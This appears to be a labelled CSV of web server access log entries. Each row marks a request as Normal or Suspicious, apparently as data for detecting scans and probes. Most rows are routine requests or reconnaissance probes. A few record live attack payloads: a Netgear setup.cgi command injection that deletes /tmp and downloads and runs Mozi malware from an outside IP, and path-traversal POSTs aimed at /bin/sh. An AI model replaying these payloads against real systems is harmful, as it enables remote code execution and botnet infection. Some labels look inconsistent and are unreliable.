IP,Request,Status,Size,Behavior
152.42.243.206,GET /cdn-cgi/trace HTTP/1.1,404,196,Suspicious
80.82.77.202,\x16\x03\x02\x01o\x01,400,226,Suspicious
93.174.93.12,GET / HTTP/1.0,200,1755,Normal
95.214.53.205,GET / HTTP/1.1,200,1755,Normal
205.210.31.220,GET / HTTP/1.0,200,1755,Normal
93.174.93.12,\x16\x03\x02\x01o\x01,400,226,Suspicious
159.223.69.51,GET /cdn-cgi/trace HTTP/1.1,404,196,Suspicious
47.254.76.138,GET / HTTP/1.1,200,1755,Normal
47.89.193.239,GET /static/admin/javascript/hetong.js HTTP/1.1,404,196,Suspicious
114.35.175.166,GET / HTTP/1.0,200,1755,Normal
167.94.138.43,GET / HTTP/1.1,200,1755,Normal
167.94.138.43,GET /favicon.ico HTTP/1.1,404,196,Suspicious
5.8.11.202,GET / HTTP/1.0,200,1755,Normal
2.57.122.209,GET / HTTP/1.1,200,1755,Normal
2.57.122.209,GET /favicon.ico HTTP/1.1,404,196,Suspicious
205.210.31.19,GET / HTTP/1.0,200,1755,Normal
5.8.11.202,\x16\x03\x02\x01o\x01,400,226,Suspicious
152.42.214.50,\x16\x03\x01\x01\v\x01,400,226,Suspicious
152.42.214.140,\x16\x03\x01\x01\v\x01,400,226,Suspicious
95.214.55.79,GET / HTTP/1.1,200,1755,Normal
81.161.238.40,GET /.env HTTP/1.1,404,196,Suspicious
5.8.11.202,GET / HTTP/1.0,200,1755,Normal
95.214.53.205,GET / HTTP/1.1,200,1755,Normal
139.162.164.128,GET / HTTP/1.1,200,1755,Normal
185.85.239.13,\x16\x03\x01\x01\xaa\x01,400,226,Suspicious
194.50.16.198,GET /login.asp HTTP/1.1,404,196,Suspicious
185.209.120.5,GET / HTTP/1.1,200,1755,Normal
185.209.120.5,GET /styles.css HTTP/1.1,200,1716,Normal
185.209.120.5,GET /favicon.ico HTTP/1.1,404,196,Suspicious
185.209.120.5,GET / HTTP/1.1,304,-,Normal
185.209.120.5,GET / HTTP/1.1,200,1755,Normal
185.209.120.5,GET /styles.css HTTP/1.1,200,1716,Normal
95.214.53.205,GET / HTTP/1.1,200,1755,Normal
125.82.242.94,-,408,-,Suspicious
194.50.16.198,GET / HTTP/1.1,200,1755,Normal
205.210.31.8,GET / HTTP/1.0,200,1755,Normal
198.235.24.143,GET / HTTP/1.0,200,1755,Normal
95.214.53.205,GET / HTTP/1.1,200,1755,Normal
106.75.65.201,GET / HTTP/1.1,200,1755,Normal
106.75.65.201,\x16\x03\x01,400,226,Suspicious
106.75.65.201,USER anonymous,400,226,Suspicious
58.208.68.190,GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://58.208.68.190:59189/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0,404,196,Suspicious
45.84.89.3,GET / HTTP/1.0,200,1755,Normal
65.49.1.45,\x16\x03\x01,400,226,Suspicious
5.79.184.27,CONNECT www.google.com:443 HTTP/1.1,405,224,Normal
5.8.11.202,GET / HTTP/1.0,200,1755,Normal
1.34.111.115,GET / HTTP/1.0,200,1755,Normal
92.249.48.208,GET / HTTP/1.1,400,226,Suspicious
194.50.16.198,POST /apply.cgi HTTP/1.1,404,196,Suspicious
185.191.126.248,GET / HTTP/1.1,200,1755,Normal
46.174.191.32,GET / HTTP/1.0,200,1755,Normal
93.174.93.12,GET / HTTP/1.0,200,1755,Normal
152.42.214.140,\x16\x03\x01\x01\v\x01,400,226,Suspicious
92.255.57.58,GET / HTTP/1.1,200,1755,Normal
92.255.57.58,GET /solr/admin/info/system?wt=json HTTP/1.1,404,196,Suspicious
92.255.57.58,GET /console/ HTTP/1.1,404,196,Suspicious
95.214.55.79,GET / HTTP/1.1,200,1755,Normal
139.59.101.104,GET /cdn-cgi/trace HTTP/1.1,404,196,Suspicious
95.214.53.205,GET / HTTP/1.1,200,1755,Normal
95.214.53.205,GET /cgi-bin/luci/;stok=/locale HTTP/1.1,404,196,Suspicious
185.209.120.11,GET / HTTP/1.1,200,1755,Normal
185.209.120.11,GET /styles.css HTTP/1.1,200,1716,Normal
185.209.120.11,GET /favicon.ico HTTP/1.1,404,196,Suspicious
185.209.120.11,GET / HTTP/1.1,304,-,Normal
185.209.120.11,GET / HTTP/1.1,200,1755,Normal
185.209.120.11,GET /styles.css HTTP/1.1,200,1716,Normal
185.209.120.11,GET /WP-ADMIN HTTP/1.1,404,196,Suspicious
194.50.16.198,GET /cgi-bin/index.html HTTP/1.1,404,196,Suspicious
104.209.35.51,GET /portal/redlion HTTP/1.1,404,196,Suspicious
5.8.11.202,GET / HTTP/1.0,200,1755,Normal
5.8.11.202,\x16\x03\x02\x01o\x01,400,226,Suspicious
95.214.53.205,GET / HTTP/1.1,200,1755,Normal
172.105.78.45,GET / HTTP/1.1,200,1755,Normal
95.214.53.205,GET / HTTP/1.1,200,1755,Normal
81.214.143.203,GET /manager/html HTTP/1.1,404,196,Suspicious
95.214.53.205,GET / HTTP/1.1,200,1755,Normal
5.8.11.202,\x16\x03\x02\x01o\x01,400,226,Suspicious
167.94.145.100,GET / HTTP/1.1,200,1755,Normal
170.64.239.33,\x16\x03\x01,400,226,Suspicious
170.64.239.33,GET / HTTP/1.1,200,1755,Normal
170.64.239.33,GET /upl.php HTTP/1.1,404,196,Suspicious
170.64.239.33,GET /geoip/ HTTP/1.1,404,196,Suspicious
170.64.239.33,GET /favicon.ico HTTP/1.1,404,196,Suspicious
170.64.239.33,GET /systembc/password.php HTTP/1.1,404,196,Suspicious
45.84.89.2,GET / HTTP/1.1,200,1755,Normal
80.82.70.133,\x16\x03\x02\x01o\x01,400,226,Suspicious
80.82.77.202,GET / HTTP/1.1,200,1755,Normal
5.8.11.202,\x16\x03\x01,400,226,Suspicious
5.8.11.202,\x16\x03\x01,400,226,Suspicious
5.8.11.202,GET /aaa9 HTTP/1.1,404,196,Suspicious
167.94.138.52,GET / HTTP/1.1,200,1755,Normal
95.214.53.205,GET / HTTP/1.1,200,1755,Normal
93.174.93.12,GET / HTTP/1.0,200,1755,Normal
159.223.69.51,GET /cdn-cgi/trace HTTP/1.1,404,196,Suspicious
37.140.242.61,POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1,400,226,Suspicious
37.140.242.61,POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1,400,226,Suspicious
80.82.77.202,GET / HTTP/1.0,200,1755,Normal
47.245.119.234,POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1,400,226,Suspicious
125.228.198.247,GET / HTTP/1.0,200,1755,Normal
95.214.55.43,GET / HTTP/1.1,200,1755,Normal
95.214.53.205,GET / HTTP/1.1,200,1755,Normal
95.214.53.205,GET / HTTP/1.1,200,1755,Normal
152.42.247.210,GET /cdn-cgi/trace HTTP/1.1,404,196,Suspicious
45.156.128.57,SSH-2.0-Go,400,226,Suspicious
45.156.128.56,\x16\x03\x01,400,226,Suspicious
